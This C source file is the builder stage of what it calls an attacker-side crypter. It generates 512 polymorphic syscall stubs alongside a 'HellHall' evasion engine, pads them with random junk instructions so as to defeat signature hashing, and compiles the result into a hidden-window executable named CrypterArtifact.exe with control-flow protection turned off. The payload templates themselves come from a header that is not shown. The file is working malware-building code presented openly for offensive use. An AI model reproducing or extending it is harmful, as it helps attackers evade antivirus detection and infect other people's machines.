#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "compiler.h"
#include "templates.h"

// --------------------------------------------------------------------------------
//  PART 3: BUILDER LOGIC
// --------------------------------------------------------------------------------
// The following code runs on the attacker's machine to build the artifact.

int build_artifact(void) {
  srand((unsigned int)time(NULL));

  // -----------------------------------------------------------------------
  // [BUILD STEP 1] Generate Assembly Stubs (Polymorphic)
  // Create 'syscalls.asm' with the evasion engine and 512 unique entry stubs.
  // -----------------------------------------------------------------------
  printf("[*] Generating syscalls.asm (HellHall + 512 Polymorphic Stubs)...\n");
  FILE *fAsm = fopen("syscalls.asm", "w");
  if (fAsm) {
    fputs(g_HellHallAsm, fAsm);
    // Target 512 stubs (covers all NTDLL)
    int STUB_COUNT = 512;

    for (int i = 0; i < STUB_COUNT; i++) {
      fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
      fprintf(fAsm, "    ALIGN 16\n"); // Align to 16 bytes
      fprintf(fAsm, "    Fnc%04X PROC\n", i);

      // Standard instruction
      fprintf(fAsm, "        mov eax, %d\n", i);
      fprintf(fAsm, "        jmp SyscallExec\n");

      // Random Junk / NOPs to fill remaining 6 bytes (16 - 10 = 6)
      // This breaks the block hash signature
      int padding = rand() % 3; // Choose random pattern
      if (padding == 0) {
        // 6 NOPs
        fprintf(fAsm, "        nop\n        nop\n        nop\n        nop\n    "
                      "    nop\n        nop\n");
      } else if (padding == 1) {
        // 3 byte (xchg r8,r8) + 3 byte (nop, nop, nop) = 6
        fprintf(fAsm,
                "        xchg r8, r8\n        nop\n        nop\n        nop\n");
      } else {
        // 2 byte (xchg ax,ax) + 2 byte (xchg ax,ax) + 2 byte (nop,nop) = 6
        fprintf(fAsm, "        xchg ax, ax\n        xchg ax, ax\n        nop\n "
                      "       nop\n");
      }

      fprintf(fAsm, "    Fnc%04X ENDP\n\n", i);
    }
    fprintf(fAsm, "end\n");
    fclose(fAsm);
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 2] Assemble & Compile
  // Invoke ML64 and CL to build the final artifact.
  // -----------------------------------------------------------------------
  printf("[*] Assembling (ML64)...\n");
  if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
    printf("[!] Assembly Failed.\n");
    return EXIT_FAILURE;
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 3] Generate C Source
  // Write artifact.c
  // -----------------------------------------------------------------------
  printf("[*] Generating artifact.c...\n");
  FILE *fC = fopen("artifact.c", "w");
  if (fC) {
    fputs(g_StubTemplate, fC);
    fclose(fC);
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 4] Compile
  // Compile the artifact C code and link it with the assembly object.
  // -----------------------------------------------------------------------
  printf("[*] Compiling Artifact (CL)...\n");
  int res =
      system("cl /nologo /O2 artifact.c syscalls.obj "
             // "sqlite-amalgamation-3510200\\sqlite3.c "
             "/Fe:CrypterArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");

  // -----------------------------------------------------------------------
  // [BUILD STEP 5] Cleanup
  // Remove temporary build files.
  // -----------------------------------------------------------------------
  system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");

  if (res == 0) {
    printf("\n[+] SUCCESS: CrypterArtifact.exe created.\n");
    return EXIT_SUCCESS;
  } else {
    printf("\n[!] FAILURE: Compilation error.\n");
    return EXIT_FAILURE;
  }
}
